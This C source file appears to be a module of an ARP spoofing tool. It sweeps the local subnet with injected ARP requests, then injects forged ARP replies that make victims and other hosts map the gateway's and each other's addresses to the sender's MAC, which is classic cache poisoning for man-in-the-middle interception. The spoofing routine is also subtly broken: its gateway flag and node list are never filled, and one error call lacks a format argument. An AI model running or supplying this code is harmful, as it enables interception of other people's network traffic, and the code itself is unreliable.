#include <stdlib.h>
#include <assert.h>
#include <string.h>

#include "arputil.hpp"
#include "nodes.hpp"
#include "netinfo.hpp"
#include "poluter.hpp"
#include "debug.hpp"
#include "util.hpp"


static void survey_perform_survey(pcap_t *handler, const struct InterfaceInfo *current) {
	DINFO("%s\n", "Starting survey");

	uint8_t buffer[ARP_IP4_SIZE];
	arp_request_create(buffer, current->addr.in, current->addr.hw, 0);

	int result = 0;

	size_t nodeCount = (1 << (32 - bitcount(current->netmask))) - 2;
	uint32_t network = ntohl(current->addr.in & current->netmask);

	for (size_t i = 0; i < nodeCount;  i++) {
		uint32_t ip4addr = htonl(network + i + 1);
		if (ip4addr != current->addr.in) {
			arp_request_set_to_ip(buffer, ip4addr);
			result = pcap_inject(handler, buffer, ARP_IP4_SIZE);
			if (result == -1) {
				DERROR("Failed to send survey to %s\n, %s", pcap_geterr(handler));
			}
		}
	}

	DINFO("%s\n", "Survey finished");
}

static void spoof_nodes(struct Poluter *self, struct NetAddress *targets, size_t targets_count) {
	DINFO("%s\n", "Starting spoofing");

	struct Node gateway;
	bool hasGW = false;
	struct NetAddress current = self->info.addr;
	size_t node_count = 0;
	struct Node *nodes = NULL;

	uint8_t buffer[ARP_IP4_SIZE] = {0};
	for (size_t i = 0; i < targets_count; i++) {
		struct NetAddress victim = targets[i];
		if (hasGW) {
			arp_reply_create(buffer, victim.in, current.hw, gateway.addr.in, gateway.addr.hw);
			pcap_inject(self->handle, buffer, ARP_IP4_SIZE);
		}
		for (size_t i = 0; i < node_count; i++) {
			if (nodes[i].is_online && nodes[i].addr.in != victim.in) {
				arp_reply_create(buffer, nodes[i].addr.in, current.hw, victim.in, victim.hw);
				pcap_inject(self->handle, buffer, ARP_IP4_SIZE);
			}
		}
	}

	DINFO("%s\n", "Spoofing finished");
}

void Poluter_prepare(struct Poluter *self, sensor_t context, pcap_t *handle) {
	self->active = false;
	self->info = context->current;
	self->handle = handle;

}
void Poluter_close(struct Poluter *self) {
	self->active = false;
}
void *Poluter_start(struct Poluter *self){
	int type;
	size_t req_size;
	uint8_t buffer[256] = {0};

	self->active = true;

	while (self->active) {
		struct PoluterMsgSpoof *req_spoof = NULL;

		MessageQueue_recv(self->queueToCore, &type, buffer, &req_size);
		switch (type) {
		case POLUTER_MSG_SPOOF:
			req_spoof = (struct PoluterMsgSpoof *)buffer;
			spoof_nodes(self, req_spoof->targets, req_spoof->target_count);
			break;
		case POLUTER_MSG_SURVEY:
			survey_perform_survey(self->handle, &self->info);
			break;
		default:
			DERROR("Unknown operation: %i", type);
			break;
		}
	}

	return NULL;
}
void Poluter_stop(struct Poluter *self) {
	self->active = false;
}
bool Poluter_isRunning(struct Poluter *self){
	return self->active;
}
